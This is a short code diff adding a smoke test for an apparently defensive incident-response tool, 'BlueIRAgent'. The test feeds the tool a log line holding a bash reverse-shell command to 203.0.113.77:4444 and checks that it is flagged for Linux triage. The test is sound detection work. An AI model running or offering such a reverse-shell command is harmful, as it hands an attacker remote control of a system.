@@ -11,3 +11,10 @@ def test_webshell_smoke():
     assert state.findings
     assert state.incident_type == "webshell_or_web_intrusion"
     assert "192.0.2.10" in state.iocs["ipv4"]
+
+
+def test_linux_ir_smoke():
+    state = BlueIRAgent().analyze("2026-05-19 09:06:14 bash -i >& /dev/tcp/203.0.113.77/4444 0>&1")
+    assert state.findings
+    assert state.incident_type == "linux_ir_triage"
+    assert state.timeline
